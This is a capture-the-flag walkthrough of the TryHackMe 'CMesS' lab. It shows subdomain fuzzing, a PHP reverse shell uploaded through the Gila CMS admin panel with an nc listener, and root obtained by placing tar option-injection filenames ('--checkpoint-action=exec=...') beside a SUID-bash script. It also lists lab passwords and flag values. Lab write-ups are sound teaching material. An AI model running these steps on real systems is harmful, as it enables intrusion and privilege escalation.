 # CTF: CMesS (THM)

## Metadata

- **Target IP:** 10.48.164.222
    
- **OS:** Ubuntu 16.04.6 LTS
    
- **Difficulty:** Easy
    
- **Date:** 2026-02-26
    
- **Key Skills/Tools:** Subdomain Fuzzing (`ffuf`), Gila CMS Exploitation, PHP Reverse Shell, Wildcard Exploitation (`tar`), Linux Privilege Escalation.
    

---

## Reconnaissance

### Port Scanning

The initial scan showed a standard web and management profile.

Bash

```
nmap -Pn $target -sV -sC
```

**Key Ports:**

- **22/tcp:** OpenSSH 7.2p2
    
- **80/tcp:** Apache 2.4.18 (Running **Gila CMS**)
    

### Subdomain Fuzzing

Initial directory brute-forcing on the main domain was noisy but didn't yield a direct foothold. However, fuzzing for subdomains revealed a `dev` environment.

Bash

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm/' -H "HOST: FUZZ.cmess.thm" -fw 522
```

**Result:** Found `dev.cmess.thm`. After adding this to `/etc/hosts`, I accessed a development log containing chat history.

---

## Credential Cracking

### Found Credentials

The development log on `dev.cmess.thm` contained a conversation where a support tech reset a user's password and posted it in the clear.

- **User:** `andre@cmess.thm`
    
- **Password:** `KPFTN_f2yxe%`
    

Later, post-foothold, a backup file was found at `/opt/.password.bak` containing Andre’s system password:

- **Andre SSH:** `UQfsdCB7aAP6`
    

---

## Foothold

### Gila CMS Shell Upload

Using the credentials found in the dev log, I logged into the Gila CMS admin panel. Gila CMS allows administrators to edit theme files or upload assets.

**Execution:**

1. Log in to `http://cmess.thm/admin`.
    
2. Navigate to the **Content -> File Manager** (or Theme editor).
    
3. Upload/Edit a `.php` file with a standard reverse shell payload.
    
4. Catch the shell using `nc -lvnp 4444`.
    

**Result:** Access as `www-data`.

---

## Lateral Movement

### Upgrading to Andre

While performing local enumeration with `linpeas.sh`, I discovered a hidden password file.

Bash

```
cat /opt/.password.bak
# Output: UQfsdCB7aAP6
```

I used these credentials to SSH into the box as **andre**, granting me access to the first flag.

Bash

```
ssh andre@$target
cat user.txt
```

---

## Privilege Escalation

### Wildcard Exploitation (tar)

Enumerating the system-wide crontab revealed a root job running every 2 minutes:

Bash

```
*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

The use of the wildcard `*` in the `tar` command is a critical vulnerability. Because `tar` interprets filenames starting with dashes as command-line flags, I can perform a **Checkpoint Execution** attack.

**Exploit Steps:**

1. Create a script that grants SUID to a shell or copies a shell.
    
2. Create two "files" whose names are actually `tar` arguments.
    

Bash

```
cd /home/andre/backup
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > exploit.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh exploit.sh"
```

**Result:**

When the cronjob runs, `tar` expands the `*` to include the filenames I created. It treats `--checkpoint=1` and `--checkpoint-action=exec...` as flags, executing my `exploit.sh` as **root**.

Bash

```
/tmp/bash -p
whoami # root
```

---

## Flags

|**Flag Type**|**Value**|
|---|---|
|**User**|thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}|
|**Root**|thm{9f85b7fdeb2cf96985bf5761a93546a2}|

---

That `tar *` exploit is such a classic. It’s the Linux equivalent of leaving the keys in the ignition with the engine running.
